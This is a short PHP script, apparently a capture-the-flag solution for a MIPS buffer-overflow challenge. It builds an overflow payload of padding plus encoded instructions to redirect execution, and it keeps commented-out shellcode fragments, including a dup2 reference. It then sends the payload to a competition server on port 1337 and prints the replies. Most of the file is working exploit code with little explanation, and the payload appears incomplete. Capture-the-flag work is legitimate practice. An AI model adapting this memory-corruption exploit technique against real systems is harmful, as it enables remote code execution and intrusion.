<?php
/*
 * 0x00400840
 *
 * li      t8, -64
 * not     reg, t8
 *
 * BF FF   (0x0040 XOR 0xFFFF, little endian)
 * 40 08   (0x0840, little endian)
 *
 *
 * lui  $v0 0xBFFF
 * li   $v1 0x4008
 * xori $v0 0xFFFF
 * jr
 */

$payload =str_repeat("\x28\x06\xff\xff", 136) .
    "\x24\x0e\xff\xbf" . // li $t6 -64;
    "\x27\x70\xc0\x01" . // nor $t6, $t6, $zero
    "\x24\x0f\x08\x40" . // li $t7 0x0840
    "";

#0x03eff821,

// shellcode << [0x0320f809].pack("N")     # jalr ra, t9
// shellcode << [0x0320f809].pack("N")      # jalr ra, t9           # dup2()
//


# 0x240fffcb,	/* li		$t7, -53		*/
# 0x01e07827,	/* nor		$t7, $t7, $zero		*/
# 0x03eff821,	/* addu		$ra, $ra, $t7		*/


# 0x01a06827,	/* nor		$t5, $t5, $zero		*/
# 0x02c07027,	/* nor		$t6, $s6, $zero		*/
# 0x01c03027,	/* nor		$a2, $t6, $zero		*/
# 0x01e07827,	/* nor		$t7, $t7, $zero		*/

# -- 0x01004027,	/* nor		$t0, $t0, $zero		*/
# 0x01204827,	/* nor		$t1, $t1, $zero		*/
# 0x01405027,	/* nor		$t2, $t2, $zero		*/
# 0x01605827,	/* nor		$t3, $t3, $zero		*/
# 0x01806027,	/* nor		$t4, $t4, $zero		*/
# 0x01a06827,	/* nor		$t5, $t5, $zero		*/
# 0x01c07027,	/* nor		$t6, $t6, $zero		*/
# 0x01e07827,	/* nor		$t7, $t7, $zero		*/

$fp = fsockopen('buffer-overflow.ctfcompetition.com', 1337);
for ($i = 0; $i < 6; $i++) {$l = fgets($fp); echo $l;}
fputs($fp, "run\n{$payload}\n");
for ($i = 0; $i < 6; $i++) {$l = fgets($fp); echo $l;}



/*

$fp = fsockopen('buffer-overflow.ctfcompetition.com', 1337);

// \x28\x06\xff\xff
*/
